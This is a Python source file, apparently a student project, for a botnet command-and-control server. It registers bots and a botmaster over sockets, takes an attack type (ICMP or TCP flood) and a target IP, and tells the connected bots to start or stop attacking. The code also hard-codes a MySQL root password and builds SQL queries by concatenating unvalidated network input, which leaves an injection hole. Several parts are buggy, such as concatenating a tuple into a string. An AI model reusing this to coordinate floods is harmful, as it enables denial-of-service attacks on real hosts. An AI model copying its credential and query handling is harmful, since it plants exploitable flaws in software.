import os
import sys
import socket
import threading
import time
import mysql.connector

mydb = mysql.connector.connect(
  host="localhost",
  user="root",
  password="cojimar5aBi",
  database="sieci"
)

mycursor = mydb.cursor()

startAttack: bool = False
ip = '192.168.100.19'
sqlDatabaseHosts = []
clientSockets = []
attack_type=''


def thread_for_botmaster(c, st):  # wrzucic w while???
    global startAttack
    global ip,attack_type
    print('Botmaster Connected')

    # todo:odebrac rodzaj ataku od botmastera
    # 1-icmp flood
    # 2-Tcp Flood
    # if rec == 1:
    #   attack_type = 'icmp_flood'
    # if rec == 2:
    #   attack_type = 'tcp_flood'
    attack_type=str(c.recv(1).decode())
    print("typ: "+attack_type)
    ip = str(c.recv(16).decode())
    ip2 = "'" + ip + "'"
    print('received target ip=' + ip)
    # dodawanie do bazy
    sql = "INSERT INTO Target (adres_ip) VALUES (" + ip2 + ")"
    mycursor.execute(sql)
    mydb.commit()
    #  //////
    startAttack = True
    stop = str(c.recv(1).decode())
    print("stop:" + stop)
    if stop == 'x':
        ip = str(c.recv(16).decode())
        startAttack = False
        print('Botmaster wants the attack to end')
        # wyswietlanie z bazy 
        mycursor.execute("SELECT * FROM Target")
        myresult = mycursor.fetchall()
        for x in myresult:
            print(x)
        # //////
    return


def thread_for_zombieBot(c, addr):
    global startAttack
    global ip
    pom = 0
    while True:
        # data received from client
        if not startAttack:
            if pom == 1:  # pom == 1 indicates that the botmaster wants to stop an ongoing attack
                c.send('0'.encode())
                print('ending attack')
                c.send(ip.encode())
                pom = 0
                return
                # if an attack stoped send IP of the new server (from botmaster)

            time.sleep(1)
            continue

        try:
            # todo:w zaleznosci od ataku wyslij odpowiedni identyfikator tj. 1,2,3 itd
            c.send(attack_type.encode())
            time.sleep(0.5)
            c.send(ip.encode())
            pom = 1
        except:
            print("Bot is disconnected")
            c.close()

        while startAttack:
            time.sleep(1)

    c.close()


def thread_for_checking_attack_status():
    flag = False
    while True:
        if not startAttack and flag:
            print("weszło")
            return

        if startAttack and not flag:
            flag = True


# close all connected clients and Ssocket
def closeConnections():
    for s in clientSockets:
        s.detach()
        s.close()
        clientSockets.remove(s)


def closeServer(socket):
    closeConnections()
    for thread in thread_array:
        try:

            print("closing thread: " + thread.name + "\nthreads left: " + str(threading.activeCount()))
            thread.join()
            thread_array.remove(thread)
        except:
            print("Error: " + thread.name)
            continue

    print("all threads terminated")

    socket.detach()
    socket.close()
    quit(0)
    sys.exit(0)


if __name__ == '__main__':

    host = '127.0.0.1'
    #host = '192.168.100.19'
    port = 65432
    max_connections = 5
    pom = 0
    x = 0
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.bind((host, port))
    socket.listen(max_connections)
    thread_array = []
    t = None
    print("Server status: running")

    try:
        while True:
            if x == 0:
                t = threading.Thread(target=thread_for_checking_attack_status,daemon=True)
                t.start()
                thread_array.append(t)
                x = 1


            if not startAttack and t.is_alive():
                client_socket, addr = socket.accept()
                clientSockets.append(client_socket)
                data = client_socket.recv(1).decode()  # info about which client type is connected: 1-bot, 2-botmaster
                if int(data) == 1:
                    print('normal bot connected')
                    #//////////////////////////////////////////////////////
                    smieci= "'" + client_socket.getpeername() + "'"
                    sql = "INSERT INTO Hosts (adres_ip) VALUES (" + smieci + ")"  ### nie wiem co to za dane wiec dalem taka nazwe zmien 
                    mycursor.execute(sql)
                    mydb.commit()
                    mycursor.execute("SELECT * FROM Hosts")
                    myresult = mycursor.fetchall()
                    for x in myresult:
                        print(x)
                    #///////////////////////////////////////////////
                    t1 = threading.Thread(target=thread_for_zombieBot, args=(client_socket, addr),daemon=True)
                    t1.start()
                    thread_array.append(t1)
                elif int(data) == 2:
                    # todo: można zrobić jakiś proces logowania i walidacje
                    #
                    t2 = threading.Thread(target=thread_for_botmaster, args=(client_socket, addr),daemon=True)
                    t2.start()
                    thread_array.append(t2)
                else:
                    print("Error: Wrong Value")

            if t is not None:
                if not t.is_alive():
                    print("cleaning up")
                    closeServer(socket)

    except KeyboardInterrupt:

        print("Server is closing")
        closeServer(socket)
        quit()
        sys.exit(0)

    sys.exit(0)
